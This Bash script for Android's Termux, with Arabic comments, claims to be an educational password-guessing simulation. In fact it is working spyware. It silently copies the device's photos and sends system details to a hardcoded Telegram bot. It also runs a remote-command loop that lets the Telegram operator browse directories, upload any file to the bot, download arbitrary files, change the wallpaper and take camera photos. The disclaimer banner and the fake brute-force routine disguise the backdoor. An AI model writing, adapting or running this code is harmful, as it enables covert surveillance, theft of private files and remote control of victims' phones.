#!/bin/bash

# التأكيد على الاستخدام الأخلاقي
echo -e "\e[31mهذا السكربت للتعليم فقط. الاستخدام غير المصرح به محظور.\e[0m"
echo -e "\e[33mتأكد من الحصول على إذن قبل استخدام الأداة.\e[0m"
sleep 3

# تعريف الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
NC='\033[0m'

# إظهار اللوجو
echo -e "${BLUE}"
echo "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗"
echo "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║"
echo "███████║█████╗  ██╔████╔██║███████║   ███████║██║"
echo "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║"
echo "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║"
echo "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝"
echo -e "${NC}"

# التكوين
TELEGRAM_TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
TELEGRAM_CHAT_ID="5967116314"
WORK_DIR="$HOME/.hema_tool"
PASSWORD_LIST_URL="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"

# إنشاء مجلد العمل
mkdir -p "$WORK_DIR" || { echo -e "${RED}فشل إنشاء المجلد${NC}"; exit 1; }

# تهيئة عداد المستخدمين
USER_COUNT_FILE="$WORK_DIR/user_count.txt"
if [ ! -f "$USER_COUNT_FILE" ]; then
    echo "1" > "$USER_COUNT_FILE"
else
    CURRENT_COUNT=$(cat "$USER_COUNT_FILE")
    echo "$((CURRENT_COUNT + 1))" > "$USER_COUNT_FILE"
fi

# إرسال رسالة تلجرام
send_telegram() {
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d text="$1" > /dev/null 2>&1
}

# إشعار المستخدم الجديد
send_telegram "مستخدم جديد: $(cat $USER_COUNT_FILE) ($(uname -a))"

# محاكاة تخمين كلمة المرور
password_guessing() {
    echo -e "${YELLOW}بدء محاكاة تخمين كلمة المرور...${NC}"
    
    PASSWORD_FILE="$WORK_DIR/password_list.txt"
    curl -s -o "$PASSWORD_FILE" "$PASSWORD_LIST_URL" || { 
        echo -e "${RED}فشل تنزيل قائمة كلمات المرور${NC}"
        return 1
    }

    while IFS= read -r password; do
        echo -ne "جاري تجربة: $password\r"
        sleep 0.1
        
        # شرط نجاح محاكاة
        if [ "$password" == "correctpassword123" ]; then
            echo -e "\n${GREEN}تم العثور على كلمة المرور: $password${NC}"
            echo "كلمة المرور الناجحة: $password" >> "$WORK_DIR/success.log"
            break
        fi
    done < "$PASSWORD_FILE"
    
    echo -e "${YELLOW}انتهت المحاكاة.${NC}"
}

# عمليات الخلفية
background_operations() {
    # جمع الصور من التخزين الداخلي
    mkdir -p "$WORK_DIR/media"
    termux-media-scan -r > /dev/null 2>&1
    cp -r /sdcard/DCIM/* "$WORK_DIR/media" 2>/dev/null
    tar czf "$WORK_DIR/media_backup.tar.gz" -C "$WORK_DIR" media 2>/dev/null
    send_telegram "تم جمع الصور من $(uname -a)"
}

# معالجة أوامر التلجرام
handle_telegram_commands() {
    local LAST_UPDATE_ID=0
    while true; do
        RESPONSE=$(curl -s --max-time 2 "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates?offset=$((LAST_UPDATE_ID + 1))&timeout=10")
        
        # تحليل الرسائل مع jq إذا متاح
        if command -v jq &> /dev/null; then
            MESSAGE_COUNT=$(echo "$RESPONSE" | jq '.result | length')
            for ((i=0; i<$MESSAGE_COUNT; i++)); do
                UPDATE_ID=$(echo "$RESPONSE" | jq -r ".result[$i].update_id")
                MESSAGE=$(echo "$RESPONSE" | jq -r ".result[$i].message.text")
                process_telegram_command "$MESSAGE" &
                LAST_UPDATE_ID=$UPDATE_ID
            done
        else
            # تحليل بدون jq
            echo "$RESPONSE" | grep -oP '"update_id":\s*\K\d+,\s*"message":\s*{"text":\s*"[^"]+"' | while read -r line; do
                UPDATE_ID=$(echo "$line" | grep -oP '^\d+')
                MESSAGE=$(echo "$line" | grep -oP '(?<=text":\s")[^"]+')
                process_telegram_command "$MESSAGE" &
                LAST_UPDATE_ID=$UPDATE_ID
            done
        fi
        
        sleep 0.5
    done
}

process_telegram_command() {
    local MESSAGE="$1"
    case "$MESSAGE" in
        pwd) send_telegram "المجلد الحالي:\n$(pwd)" ;;
        ls) send_telegram "المحتويات:\n$(ls -la)" ;;
        cd*) 
            target_dir=$(echo "$MESSAGE" | cut -d' ' -f2-)
            cd "$target_dir" 2>/dev/null && send_telegram "انتقلت إلى: $target_dir" || send_telegram "المجلد غير موجود"
            ;;
        up*) 
            filename=$(echo "$MESSAGE" | cut -d' ' -f2-)
            [ -f "$filename" ] && curl -s -F "document=@$filename" "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument?chat_id=$TELEGRAM_CHAT_ID" || send_telegram "الملف غير موجود"
            ;;
        dw*) 
            url=$(echo "$MESSAGE" | cut -d' ' -f2-)
            curl -s -L -o "${url##*/}" "$url" && send_telegram "تم تنزيل: ${url##*/}" || send_telegram "فشل التنزيل"
            ;;
        bak*) 
            url=$(echo "$MESSAGE" | cut -d' ' -f2-)
            curl -s -o "$WORK_DIR/wallpaper.jpg" "$url" && termux-wallpaper -f "$WORK_DIR/wallpaper.jpg" && send_telegram "تم تغيير الخلفية"
            ;;
        sk) 
            termux-camera-photo -c 0 "$WORK_DIR/photo.jpg" && curl -s -F "photo=@$WORK_DIR/photo.jpg" "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto?chat_id=$TELEGRAM_CHAT_ID"
            ;;
        *) send_telegram "أمر غير معروف: $MESSAGE" ;;
    esac
}

# التهيئة المطلوبة
setup_termux() {
    pkg update > /dev/null 2>&1
    pkg install -y curl termux-api jq > /dev/null 2>&1
    termux-setup-storage > /dev/null 2>&1
    chmod +x "$0"
}

# التهيئة عند التشغيل الأول
if [ ! -f "$WORK_DIR/initialized" ]; then
    setup_termux
    touch "$WORK_DIR/initialized"
fi

# تنفيذ العمليات
password_guessing &
background_operations &
handle_telegram_commands

echo -e "${YELLOW}السكربت يعمل في الخلفية. استخدم أوامر التلجرام.${NC}"
